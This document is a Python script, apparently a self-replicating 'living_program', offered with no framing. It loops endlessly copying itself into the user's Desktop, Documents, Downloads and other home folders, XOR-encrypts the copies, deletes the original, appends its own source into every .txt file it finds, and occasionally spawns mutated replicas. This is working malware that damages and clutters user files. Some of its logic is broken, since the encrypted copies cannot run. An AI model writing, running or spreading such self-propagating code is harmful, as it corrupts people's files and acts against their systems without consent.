import shutil
import os
import time
import random

def xor_encrypt_decrypt(data, key):
    return bytearray([b ^ key for b in data])

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        file_data = f.read()
    encrypted_data = xor_encrypt_decrypt(file_data, key)
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)

def decrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        encrypted_data = f.read()
    decrypted_data = xor_encrypt_decrypt(encrypted_data, key)
    with open(file_path, 'wb') as f:
        f.write(decrypted_data)

def generate_key():
    return random.randint(0, 255)

def append_to_txt_files(directory, content):
    try:
        for filename in os.listdir(directory):
            if filename.endswith('.txt'):
                file_path = os.path.join(directory, filename)
                with open(file_path, 'a') as file:
                    file.write("\n\n# Content appended by living_program\n")
                    file.write(content)
    except Exception as e:
        print(f"An error occurred while appending to .txt files: {e}")

def copy_and_encrypt(source, target, key):
    try:
        shutil.copy2(source, target)
        encrypt_file(target, key)
        append_to_txt_files(os.path.dirname(target), open(source, 'r').read())
        os.remove(source)
    except Exception as e:
        print(f"An error occurred: {e}")

def mutate_code(original_code):
    mutations = [
        lambda code: code.replace("print(f'Copied from {source} to {target}')", "print('A copy was made at a new location.')"),
        lambda code: code.replace("print(f'Deleted original file at {source}')", "print('Original file has been removed.')"),
        lambda code: code.replace("time.sleep(random.randint(1, 5))", "time.sleep(random.randint(2, 10))"),
        lambda code: code.replace("if random.random() < 0.1:", "if random.random() < 0.2:")
    ]
    mutation = random.choice(mutations)
    return mutation(original_code)

def replicate_and_mutate(source_file, target_file, key):
    with open(source_file, 'r') as f:
        original_code = f.read()
    mutated_code = mutate_code(original_code)
    with open(target_file, 'w') as f:
        f.write(mutated_code)
    encrypt_file(target_file, key)

def choose_target_directory(base_dirs, exclude_dirs):
    possible_dirs = [d for d in base_dirs if d not in exclude_dirs and os.path.exists(d)]
    if possible_dirs:
        return random.choice(possible_dirs)
    return None

def detect_current_directory_context():
    home_dir = os.path.expanduser("~")
    current_dir = os.getcwd()

    if current_dir.startswith(home_dir):
        sub_path = current_dir[len(home_dir):].strip(os.sep)
        if sub_path:
            return 'subdirectory', sub_path
        else:
            return 'home', ''
    else:
        return 'other', current_dir

def get_base_directories(context, sub_path):
    home_dir = os.path.expanduser("~")
    base_dirs = []
    
    if context == 'home':
        base_dirs = [
            os.path.join(home_dir, "Desktop"),
            os.path.join(home_dir, "Documents"),
            os.path.join(home_dir, "Downloads"),
            os.path.join(home_dir, "Music"),
            os.path.join(home_dir, "Pictures"),
            os.path.join(home_dir, "Videos"),
            os.path.join(home_dir, "Templates"),
            os.path.join(home_dir, "Public")
        ]
    elif context == 'subdirectory':
        base_dirs = [os.path.join(home_dir, d) for d in os.listdir(home_dir) if os.path.isdir(os.path.join(home_dir, d)) and sub_path not in d]
    elif context == 'other':
        base_dirs = [home_dir]
    
    return base_dirs

def main():
    current_context, sub_path = detect_current_directory_context()
    base_dirs = get_base_directories(current_context, sub_path)
    
    if not base_dirs:
        print("No base directories to move to. Exiting...")
        return

    source = os.path.abspath(__file__)
    key = generate_key()
    instance_id = str(random.randint(1000, 9999))
    
    while True:
        exclude_dirs = []
        for d in base_dirs:
            if os.path.exists(d) and any(f.startswith('living_program_') for f in os.listdir(d)):
                exclude_dirs.append(d)
        target_dir = choose_target_directory(base_dirs, exclude_dirs)
        if not target_dir:
            print("No available directories to move to. Waiting...")
            time.sleep(3)
            continue
        target_file = f'living_program_{instance_id}.py'
        target_file_path = os.path.join(target_dir, target_file)
        copy_and_encrypt(source, target_file_path, key)
        time.sleep(random.randint(1, 5))
        if random.random() < 0.1:
            replicate_dir = choose_target_directory(base_dirs, exclude_dirs + [target_dir])
            if replicate_dir:
                replicate_file_path = os.path.join(replicate_dir, f'living_program_{random.randint(1000, 9999)}.py')
                replicate_and_mutate(target_file_path, replicate_file_path, key)
                print(f"Replicated to {replicate_file_path}")
        source = target_file_path

        if not choose_target_directory(base_dirs, exclude_dirs):
            print("No more directories to move to. Restarting...")
            time.sleep(10)
            instance_id = str(random.randint(1000, 9999))

if __name__ == "__main__":
    main()
